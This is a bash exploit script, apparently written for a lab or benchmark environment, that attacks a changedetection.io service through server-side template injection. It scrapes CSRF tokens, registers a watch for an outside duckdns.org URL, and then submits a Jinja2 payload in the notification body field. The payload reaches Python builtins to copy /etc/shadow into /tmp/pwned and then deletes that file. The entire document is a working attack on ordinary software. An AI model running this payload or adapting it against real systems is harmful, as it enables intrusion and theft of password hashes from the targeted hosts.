#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Targeting SSTI exploit on ${service_map[changedetection-service]}"

# Constants
TARGET_URL="http://${service_map[changedetection-service]}"
PAYLOAD='{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__name__ == "catch_warnings" %}{% set builtins = x()._module.__builtins__ %}{% set open = builtins["open"] %}{% set os = builtins["__import__"]("os") %}{% set time = builtins["__import__"]("time") %}{{ open("/tmp/pwned", "w").write(open("/etc/shadow").read()) }}{{ time.sleep(1) }}{{ os.remove("/tmp/pwned") }}{% endif %}{% endfor %}'

# Temp files
COOKIE_JAR=$(mktemp)
DEBUG_FILE=$(mktemp)

# Step 1: Get initial page to set cookies and get CSRF token
echo "[+] Getting initial page and CSRF token"
curl -v -s "$TARGET_URL" -c "$COOKIE_JAR" > "$DEBUG_FILE" 2>&1
CSRF_TOKEN=$(grep -o 'name="csrf_token" value="[^"]*"' "$DEBUG_FILE" | head -1 | cut -d'"' -f4)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[-] Failed to obtain CSRF token"
    cat "$DEBUG_FILE"
    exit 1
fi

echo "[+] Obtained CSRF token: $CSRF_TOKEN"

# Step 2: Submit form - using verbose output to debug
echo "[+] Submitting form to add quickwatch"
curl -v -s "$TARGET_URL/form/add/quickwatch" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: $TARGET_URL" \
    -H "Referer: $TARGET_URL/" \
    -d "csrf_token=$CSRF_TOKEN&url=https%3A%2F%2Finit5.duckdns.org&tags=&edit_and_watch_submit_button=Edit+%3E+Watch&processor=text_json_diff" \
    > "$DEBUG_FILE" 2>&1

# Extract redirect URL from the debug output
REDIRECT_URL=$(grep -i "< location:" "$DEBUG_FILE" | sed 's/< location: //i' | tr -d '\r\n')

if [ -z "$REDIRECT_URL" ]; then
    echo "[-] No redirect URL found"
    cat "$DEBUG_FILE"
    exit 1
fi

echo "[+] Got redirect URL: $REDIRECT_URL"

# Step 3: Follow the redirect to get a new CSRF token
echo "[+] Following redirect to get new CSRF token"
curl -v -s "$TARGET_URL$REDIRECT_URL" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    > "$DEBUG_FILE" 2>&1

NEW_CSRF_TOKEN=$(grep -o 'name="csrf_token" value="[^"]*"' "$DEBUG_FILE" | head -1 | cut -d'"' -f4)

if [ -z "$NEW_CSRF_TOKEN" ]; then
    echo "[-] Failed to get new CSRF token"
    cat "$DEBUG_FILE"
    exit 1
fi

echo "[+] Got new CSRF token: $NEW_CSRF_TOKEN"

# Step 4: Send the payload
echo "[+] Sending payload"
curl -v -s "$TARGET_URL$REDIRECT_URL" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: $TARGET_URL" \
    -H "Referer: $TARGET_URL$REDIRECT_URL" \
    -d "csrf_token=$NEW_CSRF_TOKEN&url=https%3A%2F%2Freddit.com%2Fr%2Fall&title=&tags=&time_between_check-weeks=&time_between_check-days=&time_between_check-hours=&time_between_check-minutes=&time_between_check-seconds=30&filter_failure_notification_send=y&fetch_backend=system&webdriver_delay=&webdriver_js_execute_code=&method=GET&headers=&body=&notification_urls=&notification_title=&notification_body=$PAYLOAD&notification_format=System+default&include_filters=&subtractive_selectors=&filter_text_added=y&filter_text_replaced=y&filter_text_removed=y&trigger_text=&ignore_text=&text_should_not_be_present=&extract_text=&save_button=Save" \
    > "$DEBUG_FILE" 2>&1

if [ $? -eq 0 ]; then
    echo "[+] Payload sent successfully"
    echo "[+] The contents of /etc/shadow will be written to /tmp/pwned"
else
    echo "[-] Error sending payload"
    cat "$DEBUG_FILE"
fi

# Clean up
rm -f "$COOKIE_JAR" "$DEBUG_FILE"

echo "[+] Script execution completed. Check for the contents of /tmp/pwned on the target system"